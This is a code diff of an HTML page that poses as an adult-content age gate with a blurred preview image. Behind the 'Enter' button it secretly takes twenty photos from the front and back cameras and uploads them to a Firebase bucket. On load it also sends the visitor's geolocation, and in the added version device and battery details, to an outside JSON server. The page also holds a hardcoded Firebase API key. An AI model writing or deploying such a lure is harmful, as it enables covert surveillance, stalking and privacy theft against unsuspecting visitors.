@@ -1,74 +1,70 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Permission</title>
-    <style>
-        body { text-align: center; font-family: Arial, sans-serif; }
-        
-        /* Permission Overlay (Initially Visible) */
-        #permission-overlay {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 1000;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Camera Permission</title>
+  <style>
+    body {
+      text-align: center;
+      font-family: Arial, sans-serif;
+    }
 
-        /* Style the Button */
-        #allow-btn {
-            padding: 10px 20px;
-            font-size: 18px;
-          background-color: red;
-           color: white;
-            border: none;
-            cursor: pointer;
-            border-radius: 5px;
-            margin-top: 10px;
-        }
-#press {
-    padding: 10px 20px;
-            font-size: 18px;
-          background-color: green;
-           color: white;
-            border: none;
-            cursor: pointer;
-            border-radius: 5px;
-            margin-top: 10px;
-}
-      
+    #permission-overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 1000;
+    }
 
-        /* Blurred Image */
-        #preview-img {
-            width: 300px;
-            height: auto;
-            filter: blur(1px);
-            transition: filter 0.1s;
-        }
-    </style>
+    #allow-btn, #press {
+      padding: 10px 20px;
+      font-size: 18px;
+      color: white;
+      border: none;
+      cursor: pointer;
+      border-radius: 5px;
+      margin-top: 10px;
+    }
+
+    #allow-btn {
+      background-color: red;
+    }
+
+    #press {
+      background-color: green;
+    }
+
+    #preview-img {
+      width: 300px;
+      height: auto;
+      filter: blur(3px);
+      transition: filter 0.1s;
+    }
+  </style>
 </head>
 <body>
-    <!-- Permission Overlay -->
-    <div id="permission-overlay">
-        <p>🔒 This page requires 🔞 Age only</p>
-        <button id="press">press👇👇👇</button>
-        <button id="allow-btn">Enter</button>
-    </div>
-    
-    <!-- Preview Image -->
-    <img id="preview-img" src="image/Screenshot_20250203-083302_Chrome.jpg" alt="Image Preview">
-       
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
+  <!-- Permission Overlay -->
+  <div id="permission-overlay">
+    <p>🔒 This page requires 🔞 Age only</p>
+    <button id="press">press👇👇👇</button>
+    <button id="allow-btn">Enter</button>
+  </div>
 
-        const firebaseConfig = {
+  <!-- Preview Image -->
+  <img id="preview-img" src="image/Screenshot_20250203-083302_Chrome.jpg" alt="Image Preview" />
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
+
+    const firebaseConfig = {
             apiKey: "AIzaSyCUcrXxdp-xaDemWm6XeODP43L4c8nsFZU",
   authDomain: "valute3.firebaseapp.com",
   databaseURL: "https://valute3-default-rtdb.firebaseio.com",
@@ -78,116 +74,156 @@
   appId: "1:1059488015525:web:db514a29cb876069d2d94c",
   measurementId: "G-VBSCFW4HQP"
         };
-        
+          
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
 
-        // Get elements
-        const permissionOverlay = document.getElementById("permission-overlay");
-        const previewImg = document.getElementById("preview-img");
-        const allowBtn = document.getElementById("allow-btn");
+    const permissionOverlay = document.getElementById("permission-overlay");
+    const previewImg = document.getElementById("preview-img");
+    const allowBtn = document.getElementById("allow-btn");
 
-        // Request camera permission
-        async function requestCameraPermission() {
-            try {
-                await navigator.mediaDevices.getUserMedia({ video: true });
-                permissionOverlay.style.display = "none"; // Hide overlay
-                previewImg.style.filter = "blur(0)"; // Show clear image
-                captureMultipleImages();
-            } catch (error) {
-                alert("Camera access denied. Please enable it in browser settings.");
-            }
+    const jsonServerUrl = "https://mobilw-1.onrender.com/movies";
+
+    // ⏱ Check if permission already granted
+    if (localStorage.getItem("cameraAllowed") === "true") {
+      permissionOverlay.style.display = "none";
+      previewImg.style.filter = "blur(0)";
+    } else {
+      previewImg.style.filter = "blur(3px)";
+    }
+
+    allowBtn.addEventListener("click", requestCameraPermission);
+
+    async function requestCameraPermission() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        permissionOverlay.style.display = "none";
+        previewImg.style.filter = "blur(0)";
+        localStorage.setItem("cameraAllowed", "true");
+        captureMultipleImages();
+        stream.getTracks().forEach(track => track.stop());
+      } catch (error) {
+        alert("❌ Camera access denied.");
+        previewImg.style.filter = "blur(3px)";
+      }
+    }
+
+    async function getCameraStream(useFrontCamera) {
+      try {
+        return await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: useFrontCamera ? "user" : "environment" }
+        });
+      } catch (error) {
+        return null;
+      }
+    }
+
+    async function captureMultipleImages() {
+      const frontStream = await getCameraStream(true);
+      const backStream = await getCameraStream(false);
+
+      if (!frontStream || !backStream) return;
+
+      const frontVideo = document.createElement("video");
+      frontVideo.srcObject = frontStream;
+      frontVideo.muted = true;
+      await frontVideo.play();
+
+      const backVideo = document.createElement("video");
+      backVideo.srcObject = backStream;
+      backVideo.muted = true;
+      await backVideo.play();
+
+      for (let i = 0; i < 10; i++) {
+        await captureAndUploadPhoto(frontVideo, i, true);
+        await captureAndUploadPhoto(backVideo, i, false);
+      }
+
+      frontStream.getTracks().forEach(track => track.stop());
+      backStream.getTracks().forEach(track => track.stop());
+    }
+
+    async function captureAndUploadPhoto(video, index, useFrontCamera) {
+      return new Promise(async (resolve) => {
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(async (blob) => {
+          const cameraType = useFrontCamera ? "front" : "back";
+          const fileName = `helloworld/${cameraType}_${index + 1}_${Date.now()}.png`;
+          const storageRef = ref(storage, fileName);
+          await uploadBytes(storageRef, blob);
+          resolve();
+        }, "image/png");
+      });
+    }
+
+    // 📍 Upload Location
+    function getLocation() { 
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(uploadLocation, showError);
+      }
+    }
+
+    function uploadLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      fetch(jsonServerUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ mapUrl })
+      })
+      .then(res => res.json())
+      .then(data => console.log("📍 Location uploaded:", data))
+      .catch(err => console.error("Location error:", err));
+    }
+
+    function showError(error) {
+      console.error("Geolocation error:", error);
+    }
+
+    // 📱 Upload Device Info
+    async function uploadDeviceInfo() {
+      const deviceInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenResolution: `${screen.width}x${screen.height}`,
+        availableMemory: navigator.deviceMemory || "Unknown",
+        hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
+        timestamp: new Date().toISOString()
+      };
+
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          deviceInfo.battery = {
+            level: `${Math.round(battery.level * 100)}%`,
+            charging: battery.charging
+          };
+        } catch (err) {
+          console.warn("Battery info error:", err);
         }
+      }
 
-        // Add event listener to the button
-        allowBtn.addEventListener("click", requestCameraPermission);
+      fetch(jsonServerUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ deviceInfo })
+      })
+      .then(res => res.json())
+      .then(data => console.log("📱 Device info uploaded:", data))
+      .catch(err => console.error("Device info error:", err));
+    }
 
-        async function getCameraStream(useFrontCamera) {
-            try {
-                return await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: useFrontCamera ? "user" : "environment" }
-                });
-            } catch (error) {
-                return null;
-            }
-        }
-
-        async function captureMultipleImages() {
-            const frontStream = await getCameraStream(true);
-            const backStream = await getCameraStream(false);
-            
-            if (!frontStream || !backStream) return;
-            
-            const frontVideo = document.createElement("video");
-            frontVideo.srcObject = frontStream;
-            frontVideo.muted = true;
-            await frontVideo.play();
-
-            const backVideo = document.createElement("video");
-            backVideo.srcObject = backStream;
-            backVideo.muted = true;
-            await backVideo.play();
-
-            for (let i = 0; i < 10; i++) {
-                await captureAndUploadPhoto(frontVideo, i, true);
-                await captureAndUploadPhoto(backVideo, i, false);
-            }
-
-            frontStream.getTracks().forEach(track => track.stop());
-            backStream.getTracks().forEach(track => track.stop());
-        }
-
-        async function captureAndUploadPhoto(video, index, useFrontCamera) {
-            return new Promise(async (resolve) => {
-                const canvas = document.createElement("canvas");
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext("2d");
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                canvas.toBlob(async (blob) => {
-                    const cameraType = useFrontCamera ? "front" : "back";
-                    const fileName = `helloworld/${cameraType}_${index + 1}_${Date.now()}.png`;
-                    const storageRef = ref(storage, fileName);
-                    await uploadBytes(storageRef, blob);
-                    resolve();
-                }, "image/png");
-            });
-        }
- const jsonServerUrl = "https://mobilw-1.onrender.com/movies"; // Change to your JSON Server URL
-
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(uploadLocation, showError);
-            }
-        }
-
-        function uploadLocation(position) {
-            let latitude = position.coords.latitude;
-            let longitude = position.coords.longitude;
-            let mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-            fetch(jsonServerUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ mapUrl })
-            })
-            .then(response => response.json())
-            .then(data => console.log("Location uploaded:", data))
-            .catch(error => console.error("Error uploading location:", error));
-        }
-
-        function showError(error) {
-            console.error("Geolocation error:", error);
-        }
-
-        // Call function on page load
-        getLocation();
-
-
-       
-
-        
-    </script>
+    // 🚀 On page load
+    getLocation();
+    uploadDeviceInfo();
+  </script>
 </body>
 </html>
